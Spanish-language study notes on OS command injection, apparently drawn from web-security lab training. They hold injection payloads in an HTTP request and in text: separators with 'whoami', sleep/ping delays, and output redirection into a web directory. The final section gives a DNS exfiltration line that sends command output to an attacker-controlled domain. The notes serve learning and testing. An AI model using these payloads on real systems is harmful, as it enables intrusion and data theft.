
----------
# Definición

>Una **OS Command Injection** (inyección de comandos del sistema operativo) es una vulnerabilidad de seguridad que ocurre cuando una aplicación pasa datos no validados ni controlados por el usuario directamente a un intérprete de comandos del sistema operativo.
>
En otras palabras: el atacante logra **inyectar y ejecutar comandos arbitrarios** en el sistema operativo de la máquina donde corre la aplicación, aprovechando una entrada insegura (por ejemplo, formularios web, parámetros de URL o cabeceras HTTP).

## Características clave:

- Se da cuando una aplicación ejecuta comandos del sistema operativo (por ejemplo, mediante funciones como `system()`, `exec()`, `popen()`, etc.) usando datos proporcionados por el usuario sin filtrarlos o sanitizarlos.
    
- Permite al atacante realizar acciones más allá de la lógica prevista de la aplicación, como listar archivos, leer información sensible, crear o eliminar archivos, o incluso tomar control completo del servidor.
    
- Es considerada una vulnerabilidad **crítica** porque compromete directamente el sistema operativo.

--------------
# Métodos de inyección

- *;*
- *|* o *||*
- *&* o *&&* si el comando inicial se ejecuta correctamente (complicado)
- *$(*comando*)* si se introduce el input en cadena de texto

----------
# Explotación básica

El input del usuario se vuelca directamente en un comando a nivel de sistema, y posteriormente se ejecuta. Al no sanitizar la entrada, se puede inyectar un nuevo comando con separadores como **;** o **|**, entre otros.

-Ejemplo:
``` http
POST /product/stock HTTP/2
Host: 0a790071041999698328294100a10039.web-security-academy.net

productId=1&storeId=1; whoami;
```

----------
# Blind OS Command Injection with time delays

Para comprobar si existe una vulnerabilidad de inyección de comandos del sistema en situaciones en las que no se ve la respuesta, se puede jugar con retrasos temporales.

Existen varias formas de realizarlo, entre ellas:

- *sleep* x
- *ping* -c x 127.0.0.1

Donde *x* es el retraso temporal.

-------------
# Blind OS Command Injection with output redirection

Si hay un *directorio* de la máquina donde se almacena contenido de la web y el usuario del servidor que ejecuta el servicio web *tiene permisos de escritura* sobre este, se puede redirigir el output del comando a un archivo del directorio para posteriormente acceder a él a través del navegador.

-Ejemplo:

- El directorio donde se almacenan las imágenes (/var/www/images) está mal configurado y el usuario www-data tiene permisos de escritura.
- Se inyecta un comando como `|| whoami > /var/www/images/output.txt ||`.
- Posteriormente, se puede leer el output del comando whoami accediendo a `http://victim.com/image?filename=output.txt`.

----------
# Blind OS Command Injection with out-of-band interaction

Si no se devuelve el contenido del comando en la respuesta del servidor, se puede tratar de hacer una *resolución DNS* a un dominio controlado. Si se recibe la petición, entonces existe una vulnerabilidad de inyección de comandos del sistema.

Se puede llevar a cabo con el comando: 

- *nslookup* \[attacker-domain]

## Data Exfiltration

Para exfiltrar información del servidor, se puede aprovechar el campo del subdominio de la consulta DNS.

- *nslookup* $(*command*).attacker-domain.com